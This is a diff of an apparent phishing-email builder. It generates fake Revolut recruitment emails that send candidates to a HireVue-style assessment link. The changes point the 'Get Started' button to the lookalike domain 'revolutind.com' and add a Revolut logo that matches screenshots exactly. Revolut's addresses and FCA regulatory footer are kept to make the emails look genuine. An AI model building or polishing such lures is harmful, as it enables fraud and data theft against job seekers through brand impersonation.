@@ -1,4 +1,3 @@
-
     <!DOCTYPE html>
     <html lang="en">
     <head>
@@ -114,8 +113,8 @@
             <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
               <div class="form-group" id="assessmentLinkGroup">
                 <label for="candidateLink">Assessment Single-Use Link (Target for Get Started Button)</label>
-                <input type="text" id="candidateLink" placeholder="https://revolut-hirevue-app-eu.vercel.app/?token=cand_..." value="https://revolut-
-  hirevue-app-eu.vercel.app" oninput="updateEmailPreview()" />
+                <input type="text" id="candidateLink" placeholder="https://hirevue-app.eu.revolutind.com/?token=cand_..." value="https://hirevue-app.eu.
+  revolutind.com" oninput="updateEmailPreview()" />
               </div>
               <div class="form-group">
                 <label for="fallbackTextUrl">Fallback Text URL (At bottom of Email 2)</label>
@@ -139,7 +138,7 @@
   Gmail/Titan/Zoho, and press <strong>Ctrl + V (Paste)</strong>!
               </div>
 
-              <!-- DYNAMIC EMAIL PREVIEW CONTAINER (FULL WIDTH RESPONSIVE TO PREVENT MOBILE ZOOM OUT) -->
+              <!-- DYNAMIC EMAIL PREVIEW CONTAINER -->
               <div id="emailHTMLCard" style="background: #ffffff; border-radius: 12px; max-width: 600px; margin: 0 auto; box-shadow: 0 4px 15px rgba(0,0,
   0,0.05);"></div>
             </div>
@@ -162,7 +161,8 @@
         const FIRST_ADDR_MAP_URL = "https://www.google.com/maps/search/107+Cheapside,+London,+EC2V+6DN,+United+Kingdom?entry=gmail&source=g";
         const SECOND_ADDR_MAP_URL = "https://www.google.com/maps/search/7+Westferry+Circus,+London,+E14+4HD,+United+Kingdom?entry=gmail&source=g";
 
-        // High-resolution CDN PNG icons that are 100% clickable and render perfectly in Gmail, Outlook, Titan Mail, and Zoho Mail
+        // High-resolution CDN PNG vector logo matching exact screenshot 6.34.21 PM.jpeg
+        const REVOLUT_HEADER_LOGO_IMG = "https://img.icons8.com/ios-filled/150/000000/revolut.png";
         const SOCIAL_X_ICON = "https://img.icons8.com/ios-filled/50/94a3b8/twitterx.png";
         const SOCIAL_FB_ICON = "https://img.icons8.com/ios-filled/50/94a3b8/facebook-new.png";
         const SOCIAL_IG_ICON = "https://img.icons8.com/ios-filled/50/94a3b8/instagram-new.png";
@@ -190,19 +190,23 @@
           const role = document.getElementById('jobTitle').value.trim() || 'Phone Support Specialist (Retail)';
           const recruiter = document.getElementById('recruiterName').value.trim() || 'Patrycja Bunalska';
           const recruiterEmail = document.getElementById('recruiterEmail').value.trim();
-          const url = document.getElementById('candidateLink').value.trim() || 'https://revolut-hirevue-app-eu.vercel.app';
+          const url = document.getElementById('candidateLink').value.trim() || 'https://hirevue-app.eu.revolutind.com';
           const fallbackUrl = document.getElementById('fallbackTextUrl').value.trim() || 'https://seu.hvue.io/1h7GOqkWVpvg7jtm';
 
           const card = document.getElementById('emailHTMLCard');
 
-          // 100% Bulletproof Revolut Logo Table Header
+          // 100% Centered Revolut Image Logo Header Matching 1:1 to Screenshot 6.34.20 PM.jpeg
           const logoHeader = `
-            <div style="text-align: center; margin-bottom: 24px;">
-              <a href="${REVOLUT_LOGO_CLICK_URL}" target="_blank" style="text-decoration: none;">
-                <span style="font-family: 'Inter', system-ui, sans-serif; font-size: 28px; font-weight: 900; color: #000000; letter-spacing: -0.04em;
-  display: inline-block;">Revolut</span>
-              </a>
-            </div>
+            <table border="0" cellpadding="0" cellspacing="0" width="100%" align="center" style="margin-bottom: 28px; text-align: center; width: 100%;">
+              <tr>
+                <td align="center" style="text-align: center;">
+                  <a href="${REVOLUT_LOGO_CLICK_URL}" target="_blank" style="text-decoration: none; display: inline-block;">
+                    <img src="${REVOLUT_HEADER_LOGO_IMG}" alt="Revolut" width="160" height="38" style="width: 160px; height: auto; border: 0; display:
+  block; margin: 0 auto; outline: none; text-decoration: none;" />
+                  </a>
+                </td>
+              </tr>
+            </table>
           `;
 
           // Bulletproof Solid Blue Table Button CENTERED for Email 2
@@ -210,7 +214,7 @@
             <table border="0" cellspacing="0" cellpadding="0" align="center" style="margin: 28px auto; text-align: center;">
               <tr>
                 <td align="center" bgcolor="#0044FF" style="background-color: #0044FF; border-radius: 6px;">
-                  <a href="${url}" target="_blank" style="font-family: 'Inter', system-ui, sans-serif; font-size: 16px; font-weight: 700; color: #ffffff
+                  <a href="${url}" target="_blank" style="font-family: 'Inter', Arial, sans-serif; font-size: 16px; font-weight: 700; color: #ffffff
   !important; text-decoration: none; padding: 14px 38px; border: 1px solid #0044FF; border-radius: 6px; display: inline-block; background-color: #0044FF;
   ">
                     Get Started
@@ -254,5 +258,4 @@
   ">107 Cheapside, London, EC2V 6DN, United Kingdom</a>. Main Office: 4th Floor, The Columbus Building, <a href="${SECOND_ADDR_MAP_URL}" target="_blank"
   style="color: #1967d2 !important; text-decoration: underline;">7 Westferry Circus, London, E14 4HD, United Kingdom</a>. Revolut Ltd is authorised and
   regulated by the Financial Conduct Authority under the Electronic Money Regulations 2011, Firm Reference 900562. Revolut Ltd is an Appointed
-  Representative of Lending Works Ltd (for the activity of “operating an electronic system for lending” only) and Thornbridge Investment Management
-
+  Representative of Lending Works Ltd (for the activity of “operating an electronic system for lending” only) and Thornbridge Investment
